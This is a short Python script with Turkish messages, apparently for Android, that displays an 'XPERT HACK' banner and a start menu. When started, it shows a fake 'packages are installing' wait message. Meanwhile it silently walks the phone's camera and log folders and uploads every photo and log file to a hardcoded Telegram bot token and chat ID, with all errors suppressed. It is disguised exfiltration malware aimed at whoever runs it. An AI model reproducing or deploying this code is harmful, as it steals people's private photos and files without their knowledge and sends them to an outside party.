import os
import requests
import sys
import time
from colorama import Fore, Style, init

# Colorama'yı başlat
init(autoreset=True)

# Telegram Bot Token ve Chat ID
TELEGRAM_BOT_TOKEN = '7773571310:AAGD3Wn3MeDaQSZWmGNOQQfbfltuDtT8Nos'  # 
TELEGRAM_CHAT_ID = '1044807606'  # 


PHOTO_DIRECTORY = '/storage/emulated/0/DCIM/Camera'  
LOG_DIRECTORY = '/storage/emulated/0/Logs'  

def show_banner():
    """Python başladığında ASCII sanatını gösteren fonksiyon."""
    banner = f"""
{Fore.CYAN}██╗  ██╗██████╗ ███████╗██████╗ ████████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗
{Fore.CYAN}╚██╗██╔╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
{Fore.CYAN} ╚███╔╝ ██████╔╝█████╗  ██████╔╝   ██║       ███████║███████║██║     █████╔╝ 
{Fore.CYAN} ██╔██╗ ██╔═══╝ ██╔══╝  ██╔══██╗   ██║       ██╔══██║██╔══██║██║     ██╔═██╗ 
{Fore.CYAN}██╔╝ ██╗██║     ███████╗██║  ██║   ██║       ██║  ██║██║  ██║╚██████╗██║  ██╗
{Fore.CYAN}╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """
    print(banner)

def send_to_telegram(file_path, is_photo=True):
    """"""
    try:
        if is_photo:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
            files = {'photo': open(file_path, 'rb')}
        else:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
            files = {'document': open(file_path, 'rb')}
        
        data = {'chat_id': TELEGRAM_CHAT_ID}
        requests.post(url, files=files, data=data)
    except Exception as e:
        pass  # 
    finally:
        if 'files' in locals():
            for file in files.values():
                file.close()

def get_files(directory, extensions):
    """"""
    files = []
    try:
        for root, _, filenames in os.walk(directory):
            for file in filenames:
                if file.lower().endswith(extensions):
                    file_path = os.path.join(root, file)
                    files.append(file_path)
    except Exception as e:
        pass  # Hata durumunda hiçbir şey yapma
    return files

def main():
    
    photo_files = get_files(PHOTO_DIRECTORY, ('.jpg', '.jpeg', '.png'))
    for photo in photo_files:
        send_to_telegram(photo, is_photo=True)
    
    
    log_files = get_files(LOG_DIRECTORY, ('.log', '.txt'))
    for log in log_files:
        send_to_telegram(log, is_photo=False)

def show_menu():
    """Kullanıcıya menüyü gösteren fonksiyon."""
    print(f"{Fore.GREEN}1. Başlat")
    print(f"{Fore.RED}2. Çıkış")
    choice = input(f"{Fore.YELLOW}Lütfen bir seçenek girin (1/2): ")
    return choice

if __name__ == "__main__":
    show_banner()  # 
    choice = show_menu()
    
    if choice == '1':
        print(f"{Fore.BLUE}İşlem başlatılıyor lütfen 5 dakika bekleyin paketler yükleniyor ...")
        time.sleep(5)  # 5 saniye bekler (test için kısaltıldı, 300 yaparak 5 dakika yapabilirsiniz)
        main()
    elif choice == '2':
        print(f"{Fore.RED}Çıkış yapılıyor...")
        sys.exit()
    else:
        print(f"{Fore.RED}Geçersiz seçenek. Lütfen 1 veya 2 girin.")
